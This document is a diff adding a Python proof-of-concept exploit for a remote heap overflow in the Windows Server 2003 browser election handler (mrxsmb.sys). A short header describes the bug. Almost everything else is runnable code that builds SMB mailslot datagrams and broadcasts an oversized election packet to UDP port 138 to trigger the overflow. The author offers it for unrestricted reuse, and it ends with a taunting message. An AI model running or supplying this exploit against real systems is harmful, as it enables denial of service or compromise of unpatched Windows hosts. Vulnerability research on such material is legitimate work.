@@ -1,0 +1,126 @@
+####################################################################################
+#MS Windows Server 2003 AD Pre-Auth BROWSER ELECTION Remote Heap Overflow
+#Release date: 2011-02-14
+#Author: Cupidon-3005
+#Greet: Winny Thomas, Laurent Gaffie, h07
+#Bug: Heap Overflow
+#Remote Exploitability: Unlikely
+#Local Exploitability: Likely
+#Context: Broadcast, Pre-Auth
+#####################################################################################
+#Mrxsmb.sys, around BowserWriteErrorLog+0x175, while trying to copy 1go from ESI to EDI ...
+#Code will look something like this:
+#if ((Len + 1) * sizeof(WCHAR)) > TotalBufferSize) { Len = TotalSize/sizeof(WCHAR) - 1; }
+#-1 causes Len to go 0xFFFFFFFF
+#Feel free to reuse this code without restrictions...
+
+import socket,sys,struct
+from socket import *
+
+if len(sys.argv)<=4:    
+ sys.exit("""usage: python sploit.py UR-IP BCAST-IP NBT-NAME AD-NAME 
+ example: python sploit.py 192.168.1.10 192.168.1.255 OhYeah AD-NETBIOS-NAME""")
+
+ourip = sys.argv[1]
+host = sys.argv[2]
+srcname = sys.argv[3].upper()
+dstname = sys.argv[4].upper()
+
+
+ELEC            = "\x42\x4f\x00"
+WREDIR          = "\x41\x41\x00"
+
+def encodename(nbt,service):
+    final = '\x20'+''.join([chr((ord(i)>>4) + ord('A'))+chr((ord(i)&0xF) + ord('A')) for i in nbt])+((15 - len(nbt)) * str('\x43\x41'))+service
+    return final
+
+def lengthlittle(packet,addnum):
+    length = struct.pack("<i", len(packet)+addnum)[0:2]
+    return length
+
+def lengthbig(packet,addnum):
+    length = struct.pack(">i", len(packet)+addnum)[2:4]
+    return length
+
+def election(srcname):
+    elec = "\x08"
+    elec+= "\x09" #Be the boss or die
+    elec+= "\xa8\x0f\x01\x20" #Be the boss or die
+    elec+= "\x1b\xe9\xa5\x00" #Up time
+    elec+= "\x00\x00\x00\x00" #Null, like SDLC
+    elec+= srcname+"\x00"
+    return elec
+
+def smbheaderudp(op="\x25"):
+    smbheader= "\xff\x53\x4d\x42"
+    smbheader+= op 
+    smbheader+= "\x00"
+    smbheader+= "\x00"
+    smbheader+= "\x00\x00"
+    smbheader+= "\x00"
+    smbheader+= "\x00\x00"
+    smbheader+= "\x00\x00"
+    smbheader+= "\x00\x00\x00\x00\x00\x00\x00\x00" 
+    smbheader+=  "\x00\x00"
+    smbheader+= "\x00\x00"
+    smbheader+= "\x00\x00"
+    smbheader+= "\x00\x00"
+    smbheader+= "\x00\x00"
+    return smbheader
+
+
+def trans2mailslot(tid="\x80\x0b",ip=ourip,sname="LOVE-SDL",dname="SRD-LOVE",namepipe="\MAILSLOT\BROWSE",srcservice="\x41\x41\x00",dstservice="\x41\x41\x00",pbrowser=""):
+    packetbrowser  =  pbrowser                             
+    packetmailslot = "\x01\x00"                            
+    packetmailslot+= "\x00\x00"                            
+    packetmailslot+= "\x02\x00"                            
+    packetmailslot+= lengthlittle(packetbrowser+namepipe,4)
+    packetmailslot+= namepipe +"\x00"
+    packetdatagram = "\x11"
+    packetdatagram+= "\x02"
+    packetdatagram+= tid 
+    packetdatagram+= inet_aton(ip)
+    packetdatagram+= "\x00\x8a"
+    packetdatagram+= "\x00\xa7"
+    packetdatagram+= "\x00\x00"
+    packetdatagramname = encodename(sname,srcservice)
+    packetdatagramname+= encodename(dname,dstservice)
+    smbheader= smbheaderudp("\x25")
+    packetrans2 = "\x11"
+    packetrans2+= "\x00\x00" 
+    packetrans2+= lengthlittle(packetbrowser,0)
+    packetrans2+= "\x00\x00"
+    packetrans2+= "\x00\x00"
+    packetrans2+= "\x00"
+    packetrans2+= "\x00"
+    packetrans2+= "\x00\x00"
+    packetrans2+= "\xe8\x03\x00\x00"
+    packetrans2+= "\x00\x00"
+    packetrans2+= "\x00\x00"
+    packetrans2+= "\x00\x00"
+    packetrans2+= lengthlittle(packetbrowser,0)
+    packetrans2+= lengthlittle(smbheader+packetrans2+packetmailslot,4)
+    packetrans2+= "\x03"
+    packetrans2+= "\x00"
+    andoffset = lengthlittle(smbheader+packetrans2+packetmailslot,2)
+    lengthcalc = packetdatagramname+smbheader+packetrans2+packetmailslot+packetbrowser
+    packetfinal = packetdatagram+packetdatagramname+smbheader+packetrans2+packetmailslot+packetbrowser
+    packetotalength = list(packetfinal)
+    packetotalength[10:12] = lengthbig(lengthcalc,0)
+    packetrans2final = ''.join(packetotalength)
+    return packetrans2final
+
+def sockbroad(host,sourceservice,destservice,packet):
+   s = socket(AF_INET,SOCK_DGRAM)
+   s.setsockopt(SOL_SOCKET, SO_BROADCAST,1)
+   s.bind(('0.0.0.0', 138))
+   try:
+      packsmbheader = smbheaderudp("\x25")
+      buffer0 = trans2mailslot(tid="\x80\x22",ip=ourip,sname=srcname,dname=dstname,namepipe="\MAILSLOT\BROWSER",srcservice=sourceservice, dstservice=destservice, pbrowser=packet)
+      s.sendto(buffer0,(host,138))
+   except:
+      print "expected SDL error:", sys.exc_info()[0]
+      raise
+ 
+sockbroad(host,WREDIR,ELEC,election("A" * 410)) # -> Zing it! (between ~60->410)
+print "Happy St-Valentine Bitches\nMSFT found that one loooooooong time ago...."
